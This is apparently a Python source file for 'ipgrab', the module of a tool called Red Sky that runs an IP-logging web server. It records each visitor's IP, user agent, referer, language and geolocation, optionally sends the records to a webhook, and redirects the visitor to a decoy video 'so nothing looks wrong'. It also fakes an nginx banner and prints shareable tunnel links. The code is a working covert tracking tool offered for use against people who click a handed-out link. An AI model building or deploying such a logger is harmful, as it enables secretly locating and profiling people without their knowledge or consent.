# language: Python, file: Program/ipgrab/server.py, target: Red Sky ipgrab — HTTP logger
# Threaded HTTP server. Logs IP + UA + referer + Accept-Language + geo.
# 302s to a decoy so nothing looks wrong. Writes JSONL to Output/ipgrab/.

import json
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import List
from urllib.parse import urlparse

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR
from .geo import lookup as geo_lookup


LOG_DIR = OUTPUT_DIR / "ipgrab"
LOG_FILE = LOG_DIR / "hits.jsonl"
DECOY_DEFAULT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"


def _now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _client_ip(handler) -> str:
    """Return the real client IP. Honors X-Forwarded-For from tunnels."""
    xff = handler.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    xri = handler.headers.get("X-Real-IP", "")
    if xri:
        return xri.strip()
    return handler.client_address[0]


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx/1.24.0"
    sys_version = ""

    # class attributes injected by serve()
    decoy_url = DECOY_DEFAULT
    webhook_url = ""
    hit_callback = None

    def log_message(self, fmt, *args):
        # silence default stderr spam
        pass

    def _record(self):
        ip = _client_ip(self)
        ua = self.headers.get("User-Agent", "")
        ref = self.headers.get("Referer", "")
        lang = self.headers.get("Accept-Language", "")
        path = self.path
        method = self.command

        geo = geo_lookup(ip)

        record = {
            "ts": _now_iso(),
            "ip": ip,
            "method": method,
            "path": path,
            "ua": ua,
            "referer": ref,
            "lang": lang,
            "geo": geo,
        }

        LOG_DIR.mkdir(parents=True, exist_ok=True)
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record) + "\n")

        # pretty print to console
        print()
        print(f"{SCARLET}{BOLD}▓ HIT{RESET}  {ASH}{record['ts']}{RESET}")
        print(f"  {ARTERY}ip{RESET}       {BONE}{ip}{RESET}")
        if geo:
            loc = ", ".join(filter(None, [
                geo.get("city"), geo.get("region"), geo.get("country")
            ]))
            if loc:
                print(f"  {ARTERY}geo{RESET}      {BONE}{loc}{RESET}")
            if geo.get("isp"):
                print(f"  {ARTERY}isp{RESET}      {BONE}{geo['isp']}{RESET}")
        if ref:
            print(f"  {ARTERY}referer{RESET}  {BONE}{ref}{RESET}")
        if ua:
            print(f"  {ARTERY}ua{RESET}       {BONE}{ua[:100]}{RESET}")
        if lang:
            print(f"  {ARTERY}lang{RESET}     {BONE}{lang}{RESET}")
        print()

        if self.webhook_url:
            try:
                from .notify import send_webhook
                send_webhook(self.webhook_url, record)
            except Exception as e:
                print_warn(f"webhook failed: {e}")

        if self.hit_callback:
            try:
                self.hit_callback(record)
            except Exception:
                pass

    def do_GET(self):
        self._record()
        self.send_response(302)
        self.send_header("Location", self.decoy_url)
        self.send_header("Content-Length", "0")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_HEAD(self):
        self._record()
        self.send_response(302)
        self.send_header("Location", self.decoy_url)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self):
        # read body (some scanners do this)
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if length > 0:
                self.rfile.read(min(length, 65536))
        except Exception:
            pass
        self._record()
        self.send_response(302)
        self.send_header("Location", self.decoy_url)
        self.send_header("Content-Length", "0")
        self.end_headers()


def serve(host: str, port: int, decoy: str = DECOY_DEFAULT, webhook: str = "") -> int:
    Handler.decoy_url = decoy
    Handler.webhook_url = webhook

    LOG_DIR.mkdir(parents=True, exist_ok=True)

    print_info(f"ipgrab listening on {host}:{port}")
    print_kv("decoy", decoy)
    if webhook:
        print_kv("webhook", webhook[:60] + ("…" if len(webhook) > 60 else ""))
    print_kv("log", LOG_FILE)
    print()
    print(f"{ASH}  links to hand out:{RESET}")

    for ip in _local_ips():
        print(f"  {ARTERY}▓{RESET} {BONE}http://{ip}:{port}/{RESET}")
    print()
    print(f"{ASH}  for a public link, run in another terminal:{RESET}")
    print(f"  {ARTERY}▓{RESET} {BONE}cloudflared tunnel --url http://localhost:{port}{RESET}")
    print(f"  {ARTERY}▓{RESET} {BONE}ngrok http {port}{RESET}")
    print()
    print(f"{CLOT}  CTRL+C to stop{RESET}")
    print()

    httpd = ThreadingHTTPServer((host, port), Handler)
    httpd.daemon_threads = True
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print()
        print_info("stopped")
    finally:
        httpd.server_close()
    return 0


def _local_ips():
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None):
            fam, _, _, _, addr = info
            if fam == socket.AF_INET and not addr[0].startswith("127."):
                ips.add(addr[0])
    except socket.gaierror:
        pass
    ips.add("127.0.0.1")
    return sorted(ips)


def show_hits(limit: int = 20) -> int:
    if not LOG_FILE.exists():
        print_warn("no hits yet")
        return 0
    lines = LOG_FILE.read_text(encoding="utf-8").strip().splitlines()
    if not lines:
        print_warn("no hits yet")
        return 0

    for line in lines[-limit:]:
        try:
            r = json.loads(line)
        except json.JSONDecodeError:
            continue
        geo = r.get("geo") or {}
        loc = ", ".join(filter(None, [geo.get("city"), geo.get("region"), geo.get("country")]))
        print(f"  {ARTERY}▓{RESET} {ASH}{r['ts']}{RESET}  {BONE}{r['ip']:<16}{RESET}  {CLOT}{loc}{RESET}")
    print()
    print_kv("total", len(lines))
    return 0


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky ipgrab", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--decoy", default=DECOY_DEFAULT)
    p.add_argument("--webhook", default="")
    p.add_argument("action", nargs="?", default="serve")
    p.add_argument("--limit", type=int, default=20)

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky ipgrab [serve|hits] [--port N] [--decoy URL] [--webhook URL]")
        return 2

    if ns.help:
        print_info("redsky ipgrab [serve|hits] [--host 0.0.0.0] [--port 8080] [--decoy URL] [--webhook URL]")
        return 0

    if ns.action == "hits":
        return show_hits(ns.limit)

    return serve(ns.host, ns.port, ns.decoy, ns.webhook)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
